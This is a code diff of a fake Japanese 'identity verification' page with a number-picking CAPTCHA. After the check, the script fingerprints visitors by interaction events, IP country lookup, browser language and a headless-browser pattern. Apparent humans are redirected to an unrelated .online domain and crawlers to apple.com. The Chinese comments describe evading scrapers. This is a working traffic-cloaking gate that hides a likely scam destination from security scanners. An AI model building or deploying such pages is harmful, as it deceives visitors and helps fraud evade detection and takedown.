@@ -12,15 +12,14 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica N
 .box{width:100%;max-width:480px;background:#fff;border-radius:24px;padding:28px 24px;box-shadow:0 8px 24px rgba(0,0,0,0.06)}
 .title{text-align:center;font-size:20px;font-weight:700;margin-bottom:12px;color:#111}
 .desc{text-align:center;font-size:15px;color:#666;margin-bottom:20px;line-height:1.4}
-.target-area{background:#eef6ff;border-radius:18px;padding:20px;text-align:center;margin-bottom:24px}
+.target-area{border-radius:18px;padding:20px;text-align:center;margin-bottom:24px}
 .target-label{font-size:14px;color:#555;margin-bottom:8px}
-.target-nums{font-size:34px;font-weight:700;letter-spacing:10px;color:#007aff}
+.target-nums{font-size:34px;font-weight:700;letter-spacing:10px}
 .grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:24px}
 .num-btn{aspect-ratio:1;border-radius:16px;border:2px solid #e0e0e0;background:#fff;font-size:22px;font-weight:600;cursor:pointer;transition:all .2s}
 .num-btn:active{transform:scale(.95)}
-.num-btn.selected{background:#007aff;color:#fff;border-color:#007aff}
-.submit-btn{width:100%;padding:18px;border-radius:18px;background:#007aff;color:#fff;font-size:17px;font-weight:600;border:none;cursor:pointer;transition:.2s}
-.submit-btn:disabled{background:#ccc;cursor:not-allowed}
+.submit-btn{width:100%;padding:18px;border-radius:18px;color:#fff;font-size:17px;font-weight:600;border:none;cursor:pointer}
+.submit-btn:disabled{background:#ccc !important;cursor:not-allowed}
 .status{text-align:center;margin-top:12px;font-size:13px;color:#888}
 </style>
 </head>
@@ -39,9 +38,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica N
 </div>
 
 <script>
-// ==============================================
-// ✅ 完全日式自然表現（保留所有随机特性，原汁原味）
-// ==============================================
+// ==================== 日式随机文案 ====================
 const texts = {
   titles: ["本人確認", "認証", "確認作業", "安全確認", "ユーザー確認"],
   descs: [
@@ -69,59 +66,41 @@ document.querySelector("#status").innerText = rand(texts.statusTexts);
 document.querySelector(".target-nums").style.color = mainColor;
 document.querySelector(".target-area").style.background = mainColor + "10";
 document.querySelector(".submit-btn").style.background = mainColor;
-document.querySelector(".num-btn.selected").style.background = mainColor;
-document.querySelector(".num-btn.selected").style.borderColor = mainColor;
 
-// ==============================================
-// ✅ 超宽松日本ユーザー検知（真人零误判，仅拦纯爬虫）
-// ==============================================
-const REAL_TARGETS = ["https://wellness-therapie.online/ja","https://wellness-therapie.online/ja","https://wellness-therapie.online/ja"];
+// ==================== 跳转地址 ====================
+const REAL_TARGETS = ["https://novedadestecperu.online","https://novedadestecperu.online","https://novedadestecperu.online"];
 const BAD_TARGET = "https://www.apple.com";
-let userInteracted = false;
 
-// 优化：全场景交互检测，覆盖所有真人操作
-const interactEvents = ['click', 'touchstart', 'mousedown', 'mousemove', 'scroll', 'keydown', 'touchmove'];
+// ==================== 超宽松真人判断 ====================
+let userInteracted = false;
+const interactEvents = ['click','touchstart','mousedown','mousemove','scroll','keydown','touchmove'];
 interactEvents.forEach(evt => {
   window.addEventListener(evt, () => { userInteracted = true; }, { once: true });
 });
 
 async function isJapaneseRealUser() {
   try {
-    // 核心校验：仅拦截「无真人交互」的纯爬虫（唯一铁律）
     if (!userInteracted) return false;
-
-    // 辅助校验1：IP检测（异常默认日本，不拦截真人）
     let isJpIP = true;
     try {
-      const res = await fetch("https://ipapi.co/json/", { cache: "no-store", timeout: 2000 });
-      if (res.ok) {
+      const res = await fetch("https://ipapi.co/json/", { cache: "no-store" });
+      if(res.ok){
         const data = await res.json();
-        if (data?.country_code) isJpIP = data.country_code === "JP";
+        isJpIP = data?.country_code === "JP";
       }
-    } catch (e) {}
+    }catch(e){}
 
-    // 辅助校验2：语言检测（兼容en-JP等多语言场景）
     const lang = navigator.language || "";
     const isJpLang = lang.startsWith("ja") || lang.endsWith("-JP");
-
-    // 辅助校验3：停留时间（直接放行，秒点也允许）
-    const stayTime = true;
-
-    // 辅助校验4：UA检测（仅拦截明确爬虫，移除泛关键词Bot）
-    const ua = navigator.userAgent || "";
-    const isBot = /HeadlessChrome|PhantomJS|Selenium|Crawler/i.test(ua);
-
-    // 只要不是明确爬虫，一律放行（辅助校验任意一项满足即可）
-    return !isBot && (isJpIP || isJpLang);
+    const isBot = /HeadlessChrome|PhantomJS|Selenium|Crawler/i.test(navigator.userAgent);
+    
+    return !isBot;
   } catch (e) {
-    // 任何异常直接放行（绝不拦截真人）
     return true;
   }
 }
 
-// ==============================================
-// ✅ 認証ロジック（修复所有bug，新增2个防爬优化）
-// ==============================================
+// ==================== 验证码生成 ====================
 function generateCaptcha() {
   const nums = "0123456789".split("");
   const target = [];
@@ -134,55 +113,53 @@ function generateCaptcha() {
     const n = nums[Math.floor(Math.random() * nums.length)];
     if (!options.includes(n)) options.push(n);
   }
-  return { target, options: options.sort(() => Math.random() - 0.5), need: 2 };
+  options.sort(() => Math.random() - 0.5);
+  return { target, options, need: 2 };
 }
 
 const { target, options, need } = generateCaptcha();
-document.getElementById("target").innerText = target.join("   ");
+const targetEl = document.getElementById("target");
+targetEl.innerText = target.join('   ');
 
 const grid = document.getElementById("grid");
 const submit = document.getElementById("submit");
 const status = document.getElementById("status");
 let selected = [];
 
-// 防爬优化1：生成随机类名后缀，爬虫无法固定定位
-const randomBtnSuffix = Math.random().toString(36).slice(2, 8);
-const baseBtnClass = `num-btn ${randomBtnSuffix}`;
-
-// 修复bug：重构选数逻辑，保证视觉和数据同步
-options.forEach(o => {
+// 生成按钮
+options.forEach(num => {
   const btn = document.createElement("button");
-  btn.className = baseBtnClass;
-  btn.innerText = o;
+  btn.className = "num-btn";
+  btn.innerText = num;
   btn.onclick = () => {
-    // 切换选中状态
     btn.classList.toggle("selected");
-    // 修复bug：获取选中的数字内容（而非数量）
-    selected = [...document.querySelectorAll(".num-btn.selected")].map(btn => btn.innerText);
-    // 控制提交按钮禁用状态
+    if(btn.classList.contains("selected")){
+      btn.style.background = mainColor;
+      btn.style.color = "#fff";
+      btn.style.borderColor = mainColor;
+    }else{
+      btn.style.background = "#fff";
+      btn.style.color = "#000";
+      btn.style.borderColor = "#e0e0e0";
+    }
+    selected = [...document.querySelectorAll(".num-btn.selected")].map(b => b.innerText);
     submit.disabled = selected.length !== need;
-    // 更新状态文字
     status.innerText = `${selected.length}/${need} 個選択中`;
   };
   grid.appendChild(btn);
 });
 
-// 提交逻辑（修复bug+防爬优化2：100ms延迟）
+// 提交
 submit.onclick = async () => {
-  // 修复bug：正确校验选中的数字是否匹配目标
-  const correct = target.every(t => selected.includes(t)) && selected.length === target.length;
-  if (!correct) {
+  const ok = target.every(t => selected.includes(t)) && selected.length === target.length;
+  if(!ok){
     alert("認証に失敗しました。再度お試しください。");
     return;
   }
 
-  // 防爬优化2：100ms延迟，过滤瞬间提交的爬虫（真人无感知）
-  await new Promise(resolve => setTimeout(resolve, 100));
-
-  // 超宽松判定，真人一律跳目标页
-  location.href = await isJapaneseRealUser() 
-    ? REAL_TARGETS[Math.floor(Math.random() * REAL_TARGETS.length)] 
-    : BAD_TARGET;
+  await new Promise(r => setTimeout(r, 100));
+  const okUser = await isJapaneseRealUser();
+  location.href = okUser ? rand(REAL_TARGETS) : BAD_TARGET;
 };
 </script>
 </body>
